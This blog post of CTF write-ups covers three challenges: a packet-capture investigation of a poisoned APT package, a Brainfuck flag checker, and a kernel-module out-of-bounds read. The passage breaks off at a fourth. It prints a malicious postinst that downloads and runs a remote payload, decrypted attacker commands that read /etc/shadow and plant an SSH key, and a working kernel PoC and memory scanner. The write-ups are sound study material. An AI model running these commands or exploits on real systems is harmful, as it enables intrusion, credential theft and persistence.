@@ -1,0 +1,1750 @@
+---
+layout: post
+title: "Scarlet CTF 2026"
+date: 2026-01-11
+image: /assets/.
+categories: ["Scarlet"]
+tags: [forensic, web, rev, pwn,ctf2026]
+---
+
+## Advanced Packaged Threat — Forensics
+
+### Intro
+
+At first it seemed like just “usual admin drama”: I had added a custom repo/“PPA” for a library that had been dead for a long time, then forgot to clean it up. But this morning something made me cringe: **a foreign SSH public key appeared in `/root/.ssh/authorized_keys`**.
+
+All we have is one artifact: `intercept.pcapng`. So in this write-up I wrote an investigation—from traffic recon, dragging the "strange APT repo" thread, to opening the payload layer and finally **looking at the attacker's command** which wrote `authorized_keys` and base64 flag.
+
+
+---
+
+### Recon: what goes through PCAP?
+
+First, check the capture metadata:
+
+```bash
+capinfos intercept.pcapng
+```
+
+Then I looked for an overview of the protocol:
+
+```bash
+tshark -r intercept.pcapng -q -z io,phs
+tshark -r intercept.pcapng -q -z conv,ip
+tshark -r intercept.pcapng -q -z conv,tcp
+```
+
+What immediately "popped":
+
+- There is massive HTTP (APT update/package download).
+- There is a connection `172.22.0.2 -> 172.22.0.3:80` with `Host: knowledge-universal` (this smells like an internal repo/rogue mirror).
+- There is a connection to `:21` (FTP)… but the content is like noise (indication of encrypted / custom protocol being disguised).
+
+Listing the HTTP request for clarity:
+
+```bash
+tshark -r intercept.pcapng -Y http.request \
+  -T fields -E header=y -E separator='\t' \
+  -e frame.time -e ip.src -e ip.dst -e http.host -e http.user_agent -e http.request.uri
+```
+
+Two “personas” appear:
+
+- `Debian APT-HTTP/1.3 ...` take `.../repo/...` from `knowledge-universal`
+- `curl/7.88.1` take `/symbols.zip` and `/authorization` from the same host
+
+This is important: APT is starting, but **`curl` is locking the plan**.
+
+---
+
+### Retrieve “physical evidence” from HTTP: export objects
+
+Instead of just looking at requests, I export all the HTTP objects from PCAP:
+
+```bash
+mkdir -p exported
+tshark -r intercept.pcapng --export-objects http,exported
+ls -la exported
+```
+
+From the `exported/` folder, the two most suspicious files:
+
+- `exported/cmdtest.deb` (Debian package taken from repo `knowledge-universal`)
+- `exported/authorization` (apparently SSH public key)
+
+Check `authorization`:
+
+```bash
+file exported/authorization
+cat exported/authorization
+```
+
+Contents:
+
+```text
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHHb4NC8X/lhXcjcL1Hr/YkPz1GkXYebLZgamO4A9pq2 root@skibidi_toilet_fan
+```
+
+This is *smoking gun* that the attacker actually prepared the key to enter as root.
+
+---
+
+### Attacker's “exploit”: packet `.deb` with naughty `postinst`
+
+Now focus on `cmdtest.deb`. I disassembled the control scripts:
+
+```bash
+dpkg-deb -I exported/cmdtest.deb
+dpkg-deb -e exported/cmdtest.deb extracted/cmdtest/control
+sed -n '1,200p' extracted/cmdtest/control/postinst
+```
+
+The contents of `postinst` are short but brutal:
+
+```bash
+curl -s http://knowledge-universal/symbols.zip -o symbols.zip
+unzip -q -P very-normal-very-cool symbols.zip
+bash ./disk_cleanup
+```
+
+So the compromise flow is something like this:
+
+1. Server does `apt update` / `apt install` (possibly auto/cron).
+2. From repo `knowledge-universal`, downloaded `cmdtest.deb`.
+3. When installing, run `postinst` as root → download `symbols.zip` → run `disk_cleanup`.
+
+The “PPA” repo that you forgot is the entry point.
+
+---
+
+### Layer 2: `disk_cleanup` which is deliberately confusing
+
+I unzipped `symbols.zip` with the password from `postinst`:
+
+```bash
+unzip -P very-normal-very-cool -p exported/symbols.zip disk_cleanup > extracted/disk_cleanup.sh
+wc -c extracted/disk_cleanup.sh
+```
+
+The content isn't normal bash—it's more like an “ASCII salad” that ends up decoding the payload. A quick trick: look for the Base64 blob `H4sI...` (gzip), decode it, then look at the results.
+
+Example decode (which I used during analysis):
+
+```bash
+python3 - <<'PY'
+import re,base64,gzip
+p=open('extracted/disk_cleanup.sh','r',encoding='utf-8',errors='replace').read()
+m=re.search(r"'(H4sI[^']+)'", p)
+raw=base64.b64decode(m.group(1))
+stage=gzip.decompress(raw)
+open('extracted/disk_cleanup.decoded','wb').write(stage)
+print(stage[:200].decode('utf-8','replace'))
+PY
+```
+
+The decode result is still obfuscated again, but this time it looks like there is a long Base64. What's interesting: after trying it, the Base64 needs to be **reverse** first before it becomes a sane script.
+
+I saved the final output as `extracted/stage2.sh` (the result is basically like this):
+
+- Retrieve “gzip payload” from strange file in `yarnlib/_`
+- Append 10 extra bytes (to fix gzip that was accidentally cut)
+- `gunzip` becomes binary ELF
+- Execute the binary to connect to C2
+
+In `stage2.sh`, the IP and port are also disguised using mathematics:
+
+- IP evaluation results: `172.18.0.1`
+- Evaluation result port: `21`
+
+In PCAP, the connection appears to be going to `172.17.0.1:21` (still one internal “zone”; different subnets are common if the environment is a container/bridge).
+
+---
+
+### Layer 3: ELF payload from gzip “intentionally broken”
+
+In the data package `.deb`, there is a file that looks like “just an underscore”:
+
+```bash
+dpkg-deb -x exported/cmdtest.deb extracted/cmdtest/data
+file extracted/cmdtest/data/usr/lib/python3/dist-packages/yarnlib/_
+```
+
+That's `gzip` which is *unexpected EOF* (truncated). `stage2.sh` fixes it with `printf ... >> file`.
+
+I replicated the process to get the binary:
+
+```bash
+mkdir -p extracted/stage3
+cp extracted/cmdtest/data/usr/lib/python3/dist-packages/yarnlib/_ extracted/stage3/payload.gz
+printf '\xff\x0f4\xbe\x47\xaf\x58\xba\x11\x00' >> extracted/stage3/payload.gz
+gunzip -c extracted/stage3/payload.gz > extracted/stage3/payload
+file extracted/stage3/payload
+```
+
+The result is 64-bit ELF. The `strings` gives a clue that this is a Rust program and that there is an `--master` argument:
+
+```bash
+strings -a extracted/stage3/payload | rg -n 'linux-wifi-utility|master|MASTER2\\.1\\.2' | head
+```
+
+And most importantly: this binary hides the “FTP” session in the form of a **stream cipher**.
+
+---
+
+### Mini-RE: key stream cipher is in `.rodata`
+
+I took 32 bytes that look like the key of `.rodata`:
+
+```bash
+xxd -s 0xb7030 -l 32 extracted/stage3/payload
+```
+
+```text
+000b7030: facd f745 8d84 83b2 1419 7a72 45aa d45c  ...E......zrE..\
+000b7040: 4ff2 97e4 b902 9302 7234 e3c3 5dea 9069  O.......r4..]..i
+```
+
+Key (hex, 32-byte):
+
+```text
+facdf7458d8483b214197a7245aad45c4ff297e4b90293027234e3c35dea9069
+```
+
+Its nonce is built in the main function:
+
+- `wifi_utility::main` in `0x00011ec0`
+- There is an immediate string that forms `meow-warez:3`:
+
+```text
+0x00011fe4: movabs rax, 0x7261772d776f656d  ; "meow-war"
+0x00011ff6: mov dword [rsp+...], 0x333a7a65 ; "ez:3"
+```
+
+Join → `meow-warez:3`
+
+Conceptually:
+
+```c
+// wifi_utility::main @ 0x11ec0
+key   = *(u8[32]*)0x000b7030;
+nonce = "meow-warez:3";
+
+conn = TcpStream::connect(master_addr);   // arg --master / positional
+state = ChaCha20(key, nonce);
+
+while (recv(ciphertext_chunk)) {
+    plaintext = state.xor_keystream(ciphertext_chunk); // stream berlanjut
+    if (plaintext is command) {
+        output = sh("-c", plaintext);
+        send(state.xor_keystream(output));
+    }
+}
+```
+
+---
+
+### Forensics that “turns into an exploit”: decrypt session and read flags
+
+Why does `tshark -Y ftp` look like garbage? Because it's not real FTP—it's just via port 21.
+
+Steps:
+
+1. Take raw bytes from the TCP port 21 stream (in PCAP this stream ID is `17`)
+2. Decrypt using ChaCha20 with the key+nonce that we found
+
+Export follow stream raw:
+
+```bash
+tshark -r intercept.pcapng -q -z follow,tcp,raw,17 > extracted/tcp17_follow_raw.txt
+```
+
+Continue to decrypt:
+
+```bash
+python3 - <<'PY'
+import re,base64
+from pathlib import Path
+from Crypto.Cipher import ChaCha20
+
+# parse output follow,tcp,raw → gabungkan sesuai arah (client/server)
+lines = Path('extracted/tcp17_follow_raw.txt').read_text().splitlines()
+chunks = []
+expect = None
+buf = bytearray()
+dst = None
+
+def push():
+    global expect, buf, dst
+    chunks.append((dst, bytes(buf)))
+    expect = None
+    buf = bytearray()
+
+for line in lines:
+    if line.startswith(('====','Follow:','Filter:','Node ')) or not line.strip():
+        continue
+    s = line.strip()
+    if expect is not None:
+        if expect == 0:
+            push()
+            continue
+        if re.fullmatch(r'[0-9a-fA-F]+', s):
+            buf.extend(bytes.fromhex(s))
+            if len(buf) == expect:
+                push()
+        continue
+    if re.fullmatch(r'[0-9a-fA-F]{8}', s):
+        dst = 'c2s' if line.startswith('\t') else 's2c'
+        expect = int(s, 16)
+        buf = bytearray()
+        if expect == 0:
+            push()
+
+key = bytes.fromhex('facdf7458d8483b214197a7245aad45c4ff297e4b90293027234e3c35dea9069')
+nonce = b'meow-warez:3'
+
+c = ChaCha20.new(key=key, nonce=nonce)
+for d, ct in chunks:
+    pt = c.decrypt(ct)
+    if pt:
+        print(pt.decode('utf-8','replace'), end='')
+PY
+```
+
+The output is to immediately confess one's sins. Attackers execute commands such as:
+
+```text
+id
+pwd
+cat /etc/shadow
+curl http://knowledge-universal/authorization -o /root/.ssh/authorized_keys
+ls -laR /root
+md5sum /root/.ssh/authorized_keys
+base64 /root/flag.txt
+```
+
+And the `base64 /root/flag.txt` response contains:
+
+```text
+UlVTRUN7a24wY2tfa24wY2tfeW91X2g0dmVfYV9wNGNrNGdlX2luX3RoM19tNDFsfQo=
+```
+
+Decoding:
+
+```bash
+echo 'UlVTRUN7a24wY2tfa24wY2tfeW91X2g0dmVfYV9wNGNrNGdlX2luX3RoM19tNDFsfQo=' | base64 -d
+```
+
+### Flags
+
+`RUSEC{kn0ck_kn0ck_you_h4ve_a_p4ck4ge_in_th3_m41l}`
+
+---
+
+## Brainfuck Flag Checker — REV
+
+### Intro
+
+There are two types of “flag checkers” in CTF: the overt ones, and the ones that invite you to get lost first to make it fun. This challenge is clearly of the second type: the validation logic is not in C, not in ASM, but **Brainfuck** (`program.txt`) which is absurdly long and looks like an ASCII carpet.
+
+I'm telling you about this write-up from **recon → understanding input/output behavior → dismantling validation patterns → taking flags**.
+
+---
+
+### Recon: “There's only one file, seriously?”
+
+First look at the contents of the folder:
+
+```bash
+$ ls -la
+program.txt
+```
+
+`program.txt` contains pure Brainfuck. Because looking at your BF using your eyes is sadistic, I started by "making him talk" first.
+
+I created a small runner (`src/checker.c`) that loads `program.txt` and runs VM Brainfuck:
+
+```c
+#include <errno.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+enum {
+  TAPE_SIZE = 8192,
+  STEP_LIMIT = 600000000ULL,
+};
+
+static void die(const char *msg) {
+  fprintf(stderr, "error: %s\n", msg);
+  exit(1);
+}
+
+static void *xmalloc(size_t n) {
+  void *p = malloc(n);
+  if (!p) die("out of memory");
+  return p;
+}
+
+static char *read_entire_file(const char *path, size_t *out_len) {
+  FILE *f = fopen(path, "rb");
+  if (!f) {
+    fprintf(stderr, "error: open %s: %s\n", path, strerror(errno));
+    exit(1);
+  }
+
+  if (fseek(f, 0, SEEK_END) != 0) die("fseek failed");
+  long end = ftell(f);
+  if (end < 0) die("ftell failed");
+  if (fseek(f, 0, SEEK_SET) != 0) die("fseek failed");
+
+  size_t n = (size_t)end;
+  char *buf = xmalloc(n + 1);
+  size_t got = fread(buf, 1, n, f);
+  if (got != n) die("short read");
+  fclose(f);
+
+  buf[n] = '\0';
+  *out_len = n;
+  return buf;
+}
+
+static int is_bf(char c) {
+  return c == '<' || c == '>' || c == '+' || c == '-' || c == '.' || c == ',' ||
+         c == '[' || c == ']';
+}
+
+static char *filter_program(const char *src, size_t src_len, size_t *out_len) {
+  char *prog = xmalloc(src_len + 1);
+  size_t j = 0;
+  for (size_t i = 0; i < src_len; i++) {
+    if (is_bf(src[i])) prog[j++] = src[i];
+  }
+  prog[j] = '\0';
+  *out_len = j;
+  return prog;
+}
+
+static int *build_jumps(const char *prog, size_t prog_len) {
+  int *jump = xmalloc(sizeof(int) * prog_len);
+  int *stack = xmalloc(sizeof(int) * prog_len);
+  int sp = 0;
+
+  for (size_t i = 0; i < prog_len; i++) jump[i] = -1;
+
+  for (size_t i = 0; i < prog_len; i++) {
+    if (prog[i] == '[') {
+      stack[sp++] = (int)i;
+    } else if (prog[i] == ']') {
+      if (sp <= 0) die("unbalanced brackets");
+      int j = stack[--sp];
+      jump[i] = j;
+      jump[j] = (int)i;
+    }
+  }
+  if (sp != 0) die("unbalanced brackets");
+
+  free(stack);
+  return jump;
+}
+
+static uint8_t *read_line_as_input(size_t *out_len) {
+  char *line = NULL;
+  size_t cap = 0;
+  ssize_t nread = getline(&line, &cap, stdin);
+  if (nread < 0) {
+    free(line);
+    line = (char *)xmalloc(1);
+    line[0] = '\0';
+    nread = 0;
+  }
+
+  while (nread > 0 && (line[nread - 1] == '\n' || line[nread - 1] == '\r')) {
+    line[--nread] = '\0';
+  }
+
+  const size_t extra = 1 + 4; // newline + padding bytes (see README)
+  uint8_t *in = xmalloc((size_t)nread + extra);
+  memcpy(in, line, (size_t)nread);
+  in[nread] = '\n';
+  memset(in + nread + 1, 0, 4);
+
+  free(line);
+  *out_len = (size_t)nread + extra;
+  return in;
+}
+
+int main(int argc, char **argv) {
+  const char *program_path = "program.txt";
+  if (argc == 3 && strcmp(argv[1], "--program") == 0) program_path = argv[2];
+  if (argc != 1 && argc != 3) {
+    fprintf(stderr, "usage: %s [--program program.txt]\n", argv[0]);
+    return 2;
+  }
+
+  size_t raw_len = 0;
+  char *raw = read_entire_file(program_path, &raw_len);
+
+  size_t prog_len = 0;
+  char *prog = filter_program(raw, raw_len, &prog_len);
+  free(raw);
+
+  int *jump = build_jumps(prog, prog_len);
+
+  fprintf(stdout, "enter flag: ");
+  fflush(stdout);
+
+  size_t in_len = 0;
+  uint8_t *in = read_line_as_input(&in_len);
+  size_t in_idx = 0;
+
+  uint8_t tape[TAPE_SIZE];
+  memset(tape, 0, sizeof(tape));
+
+  size_t ptr = 0;
+  size_t ip = 0;
+  unsigned long long steps = 0;
+
+  while (ip < prog_len) {
+    if (steps++ > STEP_LIMIT) die("step limit exceeded");
+    char c = prog[ip];
+
+    switch (c) {
+      case '>':
+        if (++ptr >= TAPE_SIZE) die("tape pointer overflow");
+        break;
+      case '<':
+        if (ptr == 0) die("tape pointer underflow");
+        ptr--;
+        break;
+      case '+':
+        tape[ptr] = (uint8_t)(tape[ptr] + 1);
+        break;
+      case '-':
+        tape[ptr] = (uint8_t)(tape[ptr] - 1);
+        break;
+      case '.':
+        putchar(tape[ptr]);
+        break;
+      case ',':
+        tape[ptr] = (in_idx < in_len) ? in[in_idx++] : 0;
+        break;
+      case '[':
+        if (tape[ptr] == 0) ip = (size_t)jump[ip];
+        break;
+      case ']':
+        if (tape[ptr] != 0) ip = (size_t)jump[ip];
+        break;
+      default:
+        break;
+    }
+
+    ip++;
+  }
+
+  free(in);
+  free(jump);
+  free(prog);
+  return 0;
+}
+```
+
+```bash
+$ make
+$ ./checker
+enter flag: test
+test^@^@^@^@
+Flag is incorrect...
+```
+
+From here three things are immediately apparent:
+
+1. Program **echo** our input.
+2. There is output **NUL byte** (`^@`) appearing before the newline.
+3. There are two endings: “incorrect” and “correct”.
+
+This is not just a “regular string compare”; it's a checker that does something to the input, then terminates the branch.
+
+---
+
+## Sniffing input length: The BF reads “how many bytes anyway?”
+
+Quick trick: change the input length and see when the output starts to get weird.
+
+```bash
+$ python3 - <<'PY'
+import subprocess
+for n in [34, 35, 36]:
+    s = "A"*n
+    out = subprocess.check_output(["./checker"], input=(s+"\n").encode())
+    print(n, out)
+PY
+```
+
+The symptoms are consistent:
+
+- If the length is **< 36**, ​​you see `^@` (NUL) because BF is still "waiting" for bytes that don't exist yet, then the runner fills the rest with 0s.
+- If the length is **≥ 36**, ​​the NUL is lost.
+
+Important conclusion: this checker has the concept of **fixed-length input** (exactly 36 bytes), not "string until newline".
+
+---
+
+### Turning Brainfuck into “logic”: find a branch
+
+Brainfuck is a "minimalist version of assembly". Therefore, I treat “address” as **instruction pointer (ip)**: the BF character index after filtering to `<>+-.,[]`.
+
+The most valuable for this write-up are two ips:
+
+- `ip = 58828` → block that prints “correct”
+- `ip = 59143` → block that prints “incorrect”
+
+If you instrument the VM to log `ip` and `ptr`, you'll see that the “true/false” decisions end up around here.
+
+---
+
+### Core exploit: apparently this is an XOR checker
+
+After I dumped the contents of the tape (BF memory) at key moments, a neat pattern emerged:
+
+- **Tape[257..292]** always changes according to input (36 bytes).
+- There is another 36 byte block that is **constant**, and fits as “expected”.
+
+At this point the way of thinking changed: instead of "reading" BF, I let BF work, then I read the results of his work.
+
+#### Key observations
+
+For 36 byte input mode (no newline), the change in tape is 1:1:
+
+- input byte`i` affects `tape[257+i]`
+- so `tape[257..292]` is the result of input transformation
+
+And it turns out the transformation is super classic:
+
+```
+computed[i] = input[i] XOR key[i]
+```
+
+Where `key[i]` you can get by running the program with input 36 zero bytes (`0x00`), because:
+
+```
+computed[i] = 0x00 XOR key[i] = key[i]
+```
+
+#### The “address” is important on tape
+
+- `computed` is in `tape[257..292]` (36 bytes)
+- `expected` is in `tape[473..508]` (36 bytes)
+
+---
+
+### Pseudocode
+
+If we summarize the BF to "human form":
+
+```c
+// read 36 bytes
+uint8_t in[36] = read_exact(36);
+
+// key lives on tape; easiest to recover by feeding 36x 0x00
+uint8_t key[36] = {...};
+uint8_t expected[36] = {...}; // constant bytes stored in the program
+
+for (int i = 0; i < 36; i++) {
+  if ((in[i] ^ key[i]) != expected[i]) {
+    puts("Flag is incorrect...");
+    exit(0);
+  }
+}
+
+puts("Flag is correct!! :D");
+```
+
+Just that. His brainfuck is long because he "transports" a lot of data and performs copy/compare operations using the BF method.
+
+---
+
+### Exploit / Solve Script: dump tape, search expected, recover flag
+
+Below is the Python solver:
+
+1. Running the Brainfuck VM (no need for an external runner).
+2. Take `key = tape[257..292]` with input `\\x00*36`.
+3. Run input `'A'*36`, then look for the second occurrence of `computed` on tape to find `expected` (the first occurrence is its own computation at offset 257).
+4. Recover flag: `flag = expected XOR key`.
+
+```py
+#!/usr/bin/env python3
+from __future__ import annotations
+
+BF_CHARS = set("<>+-.,[]")
+
+def load_prog(path: str = "program.txt") -> str:
+    raw = open(path, "r", encoding="utf-8", errors="ignore").read()
+    return "".join(c for c in raw if c in BF_CHARS)
+
+def build_jumps(prog: str) -> list[int]:
+    jump = [-1] * len(prog)
+    st = []
+    for i, c in enumerate(prog):
+        if c == "[":
+            st.append(i)
+        elif c == "]":
+            j = st.pop()
+            jump[i] = j
+            jump[j] = i
+    return jump
+
+def run(prog: str, jump: list[int], inp: bytes, tape_size: int = 8192) -> bytearray:
+    tape = bytearray(tape_size)
+    ptr = 0
+    ip = 0
+    in_i = 0
+    while ip < len(prog):
+        c = prog[ip]
+        if c == ">":
+            ptr += 1
+        elif c == "<":
+            ptr -= 1
+        elif c == "+":
+            tape[ptr] = (tape[ptr] + 1) & 0xFF
+        elif c == "-":
+            tape[ptr] = (tape[ptr] - 1) & 0xFF
+        elif c == ".":
+            pass
+        elif c == ",":
+            tape[ptr] = inp[in_i] if in_i < len(inp) else 0
+            in_i += 1
+        elif c == "[":
+            if tape[ptr] == 0:
+                ip = jump[ip]
+        elif c == "]":
+            if tape[ptr] != 0:
+                ip = jump[ip]
+        ip += 1
+    return tape
+
+def xor(a: bytes, b: bytes) -> bytes:
+    return bytes(x ^ y for x, y in zip(a, b))
+
+def main() -> None:
+    prog = load_prog()
+    jump = build_jumps(prog)
+
+    tape0 = run(prog, jump, b"\\x00" * 36)
+    key = bytes(tape0[257:293])
+
+    tapeA = run(prog, jump, b"A" * 36)
+    computedA = bytes(tapeA[257:293])
+
+    # find expected by locating computedA elsewhere in tape (besides offset 257)
+    off = tapeA.find(computedA, 258)
+    assert off != -1, "expected block not found"
+    expected = bytes(tapeA[off : off + 36])
+
+    flag = xor(expected, key).decode("ascii")
+    print(flag)
+
+if __name__ == "__main__":
+    main()
+```
+
+The result:
+
+```
+RUSEC{g0d_im_s0_s0rry_for_th1s_p4in}
+```
+
+### Flags
+
+`RUSEC{g0d_im_s0_s0rry_for_th1s_p4in}`
+
+---
+
+## kAnticheat - PWN
+
+### Intro
+
+When I saw the prompt, the vibe immediately read: *"game dev pretends to be a kernel dev"*. We are given a kernel (`bzImage`), minimal rootfs, and a WIP module called `anticheat.ko`. The target is classic pwn-kernel CTF: look for bugs in drivers/modules, get primitives (read/write), then get flags.
+
+I started this write-up from recon, dismantling rootfs, reading the module via DWARF + disassembly, until finally the exploit was just... `pread()` with a "naughty" offset.
+
+---
+
+### Recon: what do we have?
+
+Initial listing:
+
+```bash
+$ ls -la
+bzImage
+kernel_config
+rootfs.cpio.gz
+run.sh
+```
+
+Run `run.sh` and see QEMU headless and KASLR on:
+
+```bash
+$ cat run.sh
+qemu-system-x86_64 \
+  -no-reboot \
+  -cpu max \
+  -net none \
+  -serial mon:stdio \
+  -display none \
+  -monitor none \
+  -vga none \
+  -kernel bzImage \
+  -initrd rootfs.cpio.gz \
+  -append "panic=-1 console=ttyS0 kaslr"
+```
+
+Unpack rootfs to search for “attack surface”:
+
+```bash
+$ mkdir -p rootfs
+$ (cd rootfs && gzip -dc ../rootfs.cpio.gz | cpio -idmv)
+
+$ ls -la rootfs | head
+anticheat.ko
+init
+...
+```
+
+And `init` immediately admitted:
+
+```bash
+$ cat rootfs/init
+...
+insmod /anticheat.ko
+exec setsid cttyhack setuidgid 100 /bin/sh ...
+```
+
+So the gist of this challenge is: module `anticheat.ko` creates an interface on `/proc/*`.
+
+---
+
+### Read the module: DWARF is a cheat code
+
+The file `anticheat.ko` turns out to be **not stripped** and there is debug info:
+
+```bash
+$ file rootfs/anticheat.ko
+ELF 64-bit LSB relocatable ... with debug_info, not stripped
+
+$ modinfo rootfs/anticheat.ko | head
+description:    Amels-Anticheat [WIP]
+name:           amels_anticheat
+vermagic:       6.16.0 SMP preempt mod_unload
+```
+
+Because there is DWARF, we can "see the struct" without the source.
+
+```bash
+$ llvm-dwarfdump --name=anticheat_blk --show-children --recurse-depth=2 rootfs/anticheat.ko
+...
+DW_TAG_structure_type "anticheat_blk" DW_AT_byte_size (0xa4)
+  member "blocking_fd"    int[20]              @ +0x00
+  member "secret_locked"  int                  @ +0x50
+  member "secret"         unsigned char[80]    @ +0x54
+```
+
+Very important:
+
+- `secret` size is `0x50` (80 bytes)
+- `secret` is at offset `+0x54` in the struct
+
+This will later become a "compass" when following the arithmetic pointer in ASM.
+
+---
+
+### Map function (address / offset)
+
+Because this is `.ko` relocatable, the “address” we use is **offset in section `.text`** (result of `objdump`).
+
+```bash
+$ objdump -d -Mintel rootfs/anticheat.ko | rg -n ' <(secret_read|secret_write|get_blk_if_safe|interact_anticheat)>:'
+0000000000000060 <secret_read>:
+00000000000000f0 <secret_write>:
+00000000000005c0 <get_blk_if_safe>:
+0000000000000180 <interact_anticheat>:
+```
+
+Our main characters: `get_blk_if_safe` in `0x5c0`.
+
+---
+
+### Technical part: the bug is in `get_blk_if_safe`
+
+`secret_read()` and `secret_write()` have the same pattern:
+
+1) Retrieve `*pos` (file offset) and `count` (number of bytes user requested).
+2) Call `get_blk_if_safe(&count, pos_ptr)` to “validate”.
+3) Copy data from/to `blk->secret + *pos`.
+
+The problem: the validation is “halfway”.
+
+#### `secret_read` / `secret_write` (pseudocode)
+
+Offset function:
+
+- `secret_read` @ `0x0000000000000060`
+- `secret_write` @ `0x00000000000000f0`
+
+Both are basically like this:
+
+```c
+// secret_read(file, user_buf, count, loff_t *pos)
+size_t n = count;
+blk = get_blk_if_safe(&n, pos);
+if (!blk) return 0;
+copy_to_user(user_buf, blk->secret + *pos, n);  // blk->secret == blk + 0x54
+*pos += n;
+return n;
+
+// secret_write(file, user_buf, count, loff_t *pos)
+size_t n = count;
+blk = get_blk_if_safe(&n, pos);
+if (!blk) return 0;
+copy_from_user(blk->secret + *pos, user_buf, n);
+*pos += n;
+return n;
+```
+
+#### Relevant ASM deductions
+
+Here's the core part `get_blk_if_safe` (offset `0x610..0x654`):
+
+```asm
+; rcx = *pos
+; rdx = count
+0x0610: mov rcx, [rbp]
+0x0614: mov rdx, [rbx]
+0x0617: lea rsi, [rcx+rdx]
+0x061b: cmp rsi, 0x50
+0x061f: ja  0x640
+
+0x0640: mov edx, 0x50
+0x0645: sub rdx, rcx        ; BUG: kalau rcx > 0x50 => underflow (unsigned)
+0x0648: mov ecx, 0x50
+0x064d: cmp rdx, rcx
+0x0650: cmova rdx, rcx      ; underflow bikin rdx "besar" => dipaksa jadi 0x50
+0x0654: mov [rbx], rdx      ; count = 0x50 (bukan error)
+```
+
+#### Pseudocode resulting from "conversion" from ASM
+
+```c
+// get_blk_if_safe(size_t *count_io, loff_t *pos)
+blk = xa_find(active_anticheats, current->pid);
+if (!blk) return NULL;
+if (blk->secret_locked) return NULL;
+
+loff_t p = *pos;
+size_t n = *count_io;
+
+if ((p + n) > 0x50) {
+  // niatnya: n = min(n, 0x50 - p)
+  // realitanya: pakai unsigned math => kalau p > 0x50 terjadi underflow
+  size_t remain = (size_t)(0x50 - p);   // UNDERFLOW kalau p > 0x50
+  if (remain > 0x50) remain = 0x50;     // underflow => remain jadi 0x50
+  *count_io = remain;
+}
+
+// BUG kedua: sama sekali nggak ada check "p <= 0x50"
+return blk;
+```
+
+If `*pos` is greater than `0x50`, this function **does not reject**. Instead he makes sure `count` becomes `0x50`, then `secret_read()` will do:
+
+```c
+copy_to_user(buf, blk->secret + *pos, count);
+```
+
+And since `blk->secret` is in `blk + 0x54`, the effective address is:
+
+```
+leak_addr = (blk + 0x54) + pos
+```
+
+If it's `pos = 0x10000000`, it's already far out of the struct → **OOB kernel read** (and its analogue OOB kernel write via `secret_write`).
+
+---
+
+### Local exploit: prove primitive OOB read
+
+I made a small PoC `poc_offsets.c` that just:
+
+- open `/proc/anticheat`
+- `pread(fd, buf, 0x50, off)`
+- dump the results
+
+```C
+#define _GNU_SOURCE
+#include <errno.h>
+#include <fcntl.h>
+#include <inttypes.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/syscall.h>
+#include <sys/types.h>
+#include <unistd.h>
+static void hexdump(const void *data, size_t len) {
+  const unsigned char *p = (const unsigned char *)data;
+  for (size_t i = 0; i < len; i++) {
+    if (i % 16 == 0)
+      printf("%04zx: ", i);
+    printf("%02x ", p[i]);
+    if (i % 16 == 15 || i + 1 == len)
+      printf("\n");
+  }
+}
+
+int main(int argc, char **argv) {
+  if (argc != 2) {
+    fprintf(stderr, "usage: %s <offset>\n", argv[0]);
+    return 2;
+  }
+
+  long long off = strtoll(argv[1], NULL, 0);
+  int fd = open("/proc/anticheat", O_RDWR);
+  if (fd < 0) {
+    perror("open(/proc/anticheat)");
+    return 1;
+  }
+
+  unsigned char buf[0x50];
+  memset(buf, 0x41, sizeof(buf));
+
+  errno = 0;
+  ssize_t r = pread(fd, buf, sizeof(buf), (off_t)off);
+  int e = errno;
+
+  printf("pread(off=%lld) -> %zd (errno=%d: %s)\n", off, r, e,
+         e ? strerror(e) : "OK");
+  hexdump(buf, sizeof(buf));
+  return 0;
+}
+```
+
+Compile:
+
+```bash
+$ gcc -O2 -static -s -o poc_offsets poc_offsets.c
+```
+
+And in the VM:
+
+```bash
+/ $ /mnt/poc_offsets 0x1000
+pread(off=4096) -> 80
+0000: b1 4d eb ff 00 93 07 80 ...
+```
+
+Just offset `0x1000` can provide non-zero bytes (kernel memory that is not secret).
+
+---
+
+### Remote exploit: service requests “ELF URL”
+
+The remote challenge is not a direct shell. He asked for the URL:
+
+```bash
+$ nc challs.ctf.rusec.club 47095
+Enter URL of compiled exploit:
+```
+
+The binary from that URL is downloaded, placed in `/mnt/exploit`, then the VM boots and we get a normal user shell. So the most relaxing strategy:
+
+1) Compile exploit into 1 ELF file (safer `-static`)
+2) Host the binary in a public hosts file
+3) Paste the URL into the service
+4) Run `/mnt/exploit ...` in the remote VM
+
+### “Exploit” used: scans memory for flag string
+
+Since this is CTF, the format flag is `RUSEC{...}`. So the cheapest exploit is: *scan kernel memory leak until you find that substring*.
+
+Core loop in `find_rusec.c`:
+
+```c
+for (off = 0x1000; off < end; off += 0x50) {
+  pread(ac, buf, 0x50, off);
+  if (memmem(window, sizeof(window), "RUSEC{", 6)) {
+    pread(ac, out, 0x50, hit_off + 0x00);
+    pread(ac, out, 0x50, hit_off + 0x50);
+    pread(ac, out, 0x50, hit_off + 0xa0);
+    pread(ac, out, 0x50, hit_off + 0xf0);
+    if (strchr(out, '}')) print(out);
+  }
+}
+```
+
+Compile:
+
+```bash
+$ gcc -O2 -static -s -o find_rusec find_rusec.c
+```
+
+Upload to catbox (which is easy and doesn't involve MIME-type):
+
+```bash
+$ curl -fsS \
+  -F reqtype=fileupload \
+  -F "fileToUpload=@find_rusec" \
+  https://catbox.moe/user/api.php
+
+https://files.catbox.moe/xnh9oq
+```
+
+Paste that URL into `nc`, then in a remote shell run:
+
+```sh
+/ $ /mnt/exploit 0x10000000
+found 'RUSEC{' at offset 0x45fdfac
+candidate: RUSEC{k3rnel_p4nic_n0t_sp4cetiming}
+```
+
+### Flags
+
+`RUSEC{k3rnel_p4nic_n0t_sp4cetiming}`
+
+---
+
+## ruid_login — PWN
+
+Target: `nc challs.ctf.rusec.club 4622`
+
+### Intro
+At first, it looks like a normal “login system”: enter netID, then enter RUID. But the longer I played, the vibes changed to: *"This is campus, but how come there is a function pointer on the user table?"*
+
+I started this write-up from recon, flow surgery, finding bugs, to the exploit that was actually used in the PoC (`solve.py`) to issue the flag.
+
+---
+
+### Recon: get to know the binaries first
+
+I started with the most standard: ELF type check, mitigation, and “noisy” strings.
+
+```bash
+$ file ruid_login
+ruid_login: ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped
+
+$ checksec --file=ruid_login
+[*] '/root/ctf/scarlet/pwn/ruid_login/ruid_login'
